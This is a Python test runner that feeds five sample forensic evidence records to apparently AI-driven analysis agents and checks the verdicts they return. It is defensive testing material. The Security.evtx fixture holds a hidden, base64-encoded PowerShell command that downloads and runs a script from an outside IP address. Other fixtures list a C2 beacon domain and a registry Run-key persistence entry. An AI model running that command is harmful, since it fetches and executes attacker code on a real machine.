"""
Comprehensive Multi-Agent Real GPU Test Runner: All 5 Agents + Supervisor
Tests Network, Memory, Disk, Logs, and Registry against the live Colab Tesla T4 GPU.
"""

import os
import sys
import json
import time
from pathlib import Path

BACKEND_DIR = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(BACKEND_DIR))

from app.core.config import settings
from app.services.model_adapter_service import ModelAdapterService

# Agent test payloads using real forensic indicators from the project
TEST_PAYLOADS = [
    {
        "domain": "network",
        "agent_name": "Network Agent (Pranay)",
        "evidence_type": "PCAP DNS Flow",
        "evidence_content": {
            "evidence_id": "EV-NET-PCAP-001",
            "artifact_type": "DNS Query & Socket Flow",
            "source_file": "sample.pcap",
            "extracted_records": [
                {
                    "dns_query": "c2-command-beacon.darknet.org",
                    "resolved_ip": "185.220.101.5",
                    "src_ip": "192.168.1.50",
                    "src_port": 49152,
                    "dst_port": 53,
                    "protocol": "UDP/DNS",
                    "query_count": 48,
                    "interval_seconds": 60,
                    "timestamp_utc": "2026-09-15T08:25:00Z"
                }
            ]
        }
    },
    {
        "domain": "memory",
        "agent_name": "Memory Agent (Bharath)",
        "evidence_type": "RAM Volatile Memory",
        "evidence_content": {
            "evidence_id": "EV-MEM-MALFIND-001",
            "artifact_type": "Process Memory Injection",
            "source_file": "memory.raw",
            "extracted_records": [
                {
                    "process_name": "csrss.exe",
                    "pid": 584,
                    "ppid": 488,
                    "page_protection": "PAGE_EXECUTE_READWRITE",
                    "tag": "VadS",
                    "vad_allocation_base": "0x00020000",
                    "hexdump_lead": "4d5a90000300000004000000ffff0000",
                    "disassembly_indicator": "jmp rel32 / shellcode prologue",
                    "timestamp_utc": "2026-09-15T08:24:12Z"
                }
            ]
        }
    },
    {
        "domain": "disk",
        "agent_name": "Disk Agent (Aswith)",
        "evidence_type": "Windows Prefetch",
        "evidence_content": {
            "evidence_id": "EV-DISK-PREFETCH-001",
            "artifact_type": "Windows Prefetch Execution",
            "source_file": "VMWARETRAY.EXE-029F476F.pf",
            "extracted_records": [
                {
                    "executable_name": "VMWARETRAY.EXE",
                    "run_count": 10,
                    "prefetch_hash": "6F479F02",
                    "windows_version": "Windows 7",
                    "file_path": "C:\\Program Files\\VMware\\VMware Tools\\VMwareTray.exe",
                    "referenced_files_count": 20,
                    "timestamp_utc": "2026-09-15T08:22:14Z"
                }
            ]
        }
    },
    {
        "domain": "logs",
        "agent_name": "Log Agent (Sanhith)",
        "evidence_type": "Security Event Log",
        "evidence_content": {
            "evidence_id": "EV-LOG-SEC-001",
            "artifact_type": "Windows Security EVTX",
            "source_file": "Security.evtx",
            "extracted_records": [
                {
                    "event_id": 4688,
                    "process_name": "powershell.exe",
                    "command_line": "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANQAvAGIAMgAnACkA",
                    "parent_process_name": "cmd.exe",
                    "user_sid": "S-1-5-21-345-500",
                    "account_name": "Administrator",
                    "timestamp_utc": "2026-09-15T08:24:45Z"
                }
            ]
        }
    },
    {
        "domain": "registry",
        "agent_name": "Registry Agent (Kishor)",
        "evidence_type": "Registry Hive",
        "evidence_content": {
            "evidence_id": "EV-REG-RUN-001",
            "artifact_type": "Registry Run Key Persistence",
            "source_file": "SYSTEM",
            "extracted_records": [
                {
                    "hive": "HKLM",
                    "key_path": "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                    "value_name": "WindowsUpdaterService",
                    "value_data": "C:\\Windows\\Temp\\update_svc.exe /run",
                    "value_type": "REG_SZ",
                    "last_written_utc": "2026-09-15T08:23:30Z"
                }
            ]
        }
    }
]


def test_all_agents():
    print("=" * 80)
    print("[TEST SUITE] SHERLOCK AI: ALL 5 DOMAIN AGENTS REAL GPU INFERENCE")
    print("=" * 80)
    remote_url = ModelAdapterService.get_remote_gpu_url()
    print(f"[*] Remote GPU Tunnel Endpoint: {remote_url}\n")

    results = []
    total_start = time.time()

    for idx, test in enumerate(TEST_PAYLOADS, 1):
        domain = test["domain"]
        agent_name = test["agent_name"]
        ev_type = test["evidence_type"]

        print(f"\n[{idx}/5] Testing {agent_name}...")
        print(f"      Evidence: {ev_type} ({test['evidence_content']['source_file']})")

        start = time.time()
        try:
            res = ModelAdapterService.analyze_domain_evidence(
                domain=domain,
                evidence_type=ev_type,
                evidence_content=test["evidence_content"]
            )
            elapsed = time.time() - start

            assessment = res.get("assessment") or res.get("classification")
            risk = res.get("risk") or res.get("risk_level")
            provider = res.get("inference_provider", "Unknown")
            reasoning = res.get("reasoning", "")[:120] + "..."

            # Validate quality contract
            assert res.get("contract_validated") is True, f"Contract validation failed for {domain}"
            assert assessment in ("BENIGN", "SUSPICIOUS", "MALICIOUS", "OBSERVED", "INCONCLUSIVE"), f"Invalid assessment: {assessment}"

            print(f"      [OK] Duration: {elapsed:.2f}s | Provider: {provider}")
            print(f"           Assessment: {assessment} | Risk: {risk}")
            print(f"           Reasoning:  {reasoning}")

            results.append({
                "agent": agent_name,
                "domain": domain,
                "status": "PASS",
                "assessment": assessment,
                "risk": risk,
                "duration_s": round(elapsed, 2),
                "provider": provider,
                "finding_id": res.get("finding_id")
            })
        except Exception as e:
            elapsed = time.time() - start
            print(f"      [FAIL] Error: {e}")
            results.append({
                "agent": agent_name,
                "domain": domain,
                "status": "FAIL",
                "error": str(e),
                "duration_s": round(elapsed, 2)
            })

    total_duration = time.time() - total_start

    print("\n" + "=" * 80)
    print("[REPORT] MULTI-AGENT GPU INFERENCE SUMMARY")
    print("=" * 80)
    print(f"{'Agent':<25} | {'Domain':<10} | {'Status':<6} | {'Assessment':<12} | {'Risk':<8} | {'Latency'}")
    print("-" * 80)
    for r in results:
        status_tag = "[PASS]" if r["status"] == "PASS" else "[FAIL]"
        print(f"{r['agent']:<25} | {r['domain']:<10} | {status_tag:<6} | {r.get('assessment', 'N/A'):<12} | {r.get('risk', 'N/A'):<8} | {r['duration_s']}s")
    print("-" * 80)
    print(f"Total Test Suite Duration: {total_duration:.2f}s across {len(results)} Agents")
    print("=" * 80)

    # Assert all passed
    failures = [r for r in results if r["status"] != "PASS"]
    assert len(failures) == 0, f"{len(failures)} agent inferences failed!"
    print("\n[SUCCESS] ALL 5 FORENSIC DOMAIN AGENTS TESTED AND VERIFIED ON REAL GPU!\n")


if __name__ == "__main__":
    test_all_agents()
